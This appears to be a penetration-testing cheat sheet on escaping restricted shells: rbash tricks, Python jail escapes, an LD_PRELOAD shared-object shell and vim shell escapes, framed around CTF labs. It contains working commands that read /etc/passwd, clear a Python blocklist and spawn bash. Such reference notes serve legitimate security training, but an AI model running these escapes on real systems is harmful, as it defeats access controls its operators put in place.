# Restricted Shells

[![linuxprivilegeescalation](../../../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
[![escaping_from_jails](../../../../_badges/hacktricks/escaping_from_jails.svg)](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/escaping-from-limited-bash#bash-jails)
[![bash_restricted_shells](../../../../_badges/rootme/app_script/bash_restricted_shells.svg)](https://www.root-me.org/en/Challenges/App-Script/Bash-Restricted-shells)

<div class="row row-cols-lg-2"><div>

A restricted shell such as `rbash` is a shell that restrict the action of the user to a limited list of commands/arguments. For instance, for rbash:

* we cannot use commands with pathnames containing a "/"
* we can use `help` to list available commands
* we cannot use `cd`
* more restrictions may be in place

To escape of restricted shells, we can try to use command substitution (ex: <code>ls \`pwd\`</code>), command chaining, or editing environment variables.
</div><div>

Common tricks:

* **List files**: `echo /*` and `echo /.*`
* **Read a file**: `read f < /etc/passwd; echo $f`
* **Read a file**: `f=$(</etc/passwd); echo $f`

Use `compgen -c`, `help`, or `<tab>` to list available commands.

📚 Sometimes, `ssh [...] -t "/bin/bash --noprofile"` may work.
</div></div>

<hr class="sep-both">

## Restricted Bash (rbash)

[![bash_restricted_shells](../../../../_badges/rootme/app_script/bash_restricted_shells.svg)](https://www.root-me.org/en/Challenges/App-Script/Bash-Restricted-shells)

<div class="row row-cols-lg-2"><div>

#### Enumeration

The `readonly` command is useful to list which variable you can't edit.

```shell!
$ readonly
ENV
PATH
HOME
```

You can use `declare` to get information about your environment.

```shell!
$ declare -x # remove -x to see functions
BASH_VERSINFO=([0]="4" [1]="4" [2]="20" [3]="1" [4]="release" [5]="i686-pc-linux-gnu")
BASH_VERSION='4.4.20(1)-release'
PATH=/tmp/void/
SHELLOPTS=braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor
```
</div><div>

#### Read a file

Method using `mapfile`:

```shell!
$ mapfile array < /etc/passwd
$ echo ${array[@]}
```

Method using `history`:

```shell!
$ export HISTFILE=/etc/passwd
$ history -r
$ history
```

Method using `bind`:

```shell!
$ bind -f /etc/passwd
```
</div></div>

<hr class="sep-both">

## Python Jails

<div class="row row-cols-lg-2"><div>

#### Python Jails Enumeration

Find variables and information about your context:

```py
globals()     # global symbols (variables, functions)
locals()      # local symbols (function, method, block)
vars()        # without any argument, same as 'locals'
```

```py
__builtins__.__dict__
del __builtins__  # restore them
```

#### Python File Write

[![pythonplayground](../../../../_badges/thm-p/pythonplayground.svg)](https://tryhackme.com/r/room/pythonplayground)

You can arbitrarily create files or python scripts using:

```py
print("Hello, World!", file=open("/dev/shm/poc", "w"))
print("im"+"port os\nprint(os.getcwd())", file=open("/dev/shm/poc.py", "w"))
```

#### Python File Read

```py
file=open("/etc/passwd", "r"); print(''.join(file.readlines()))
help('print') # :e/path/to/file
```
</div><div>

#### Python Jails Escape

[![pythonplayground](../../../../_badges/thm-p/pythonplayground.svg)](https://tryhackme.com/r/room/pythonplayground)

Arbitrarily set a variable, such as the list of blocked commands:

```py
setattr(__import__('__main__'),'blocklist',[])
```

Set the path to load arbitrary Python files:

```py
setattr(__import__("sys"), "path", list(("/dev/shm/",)))
__import__("my_file")
```

Use breakpoint:

```py
breakpoint() # then write any python code
```
</div></div>

<hr class="sep-both">

## Special Scenarios

<div class="row row-cols-lg-2"><div>

#### LD_PRELOAD

[![bash_restricted_shells](../../../../_badges/rootme/app_script/bash_restricted_shells.svg)](https://www.root-me.org/en/Challenges/App-Script/Bash-Restricted-shells)

If we have access to a program that honor `LD_PRELOAD`, e.g. any command aside from the builtin functions, we may be able to pop a bash. For that to be possible, we need a malicious `.so`. 

If `gcc` is available, we can easily compile one, while it's unlikely. 

```shell!
$ echo 'void _init() {' > /tmp/test.c
$ echo 'system("/bin/bash");' >> /tmp/test.c
$ echo '}' >> /tmp/test.c
$ gcc -shared -fPIC /tmp/test.c -o /tmp/test.so -nostartfiles
$ LD_PRELOAD='/tmp/test.so' gcc
```

➡️ If gcc is available, `gcc -wrapper /bin/bash,-s .` is faster.
</div><div>

#### VIM

[![bash_restricted_shells](../../../../_badges/rootme/app_script/bash_restricted_shells.svg)](https://www.root-me.org/en/Challenges/App-Script/Bash-Restricted-shells)

If you can run VIM, it's easy to escape:

```ruby!
:set shell=/bin/bash
:shell
```
</div></div>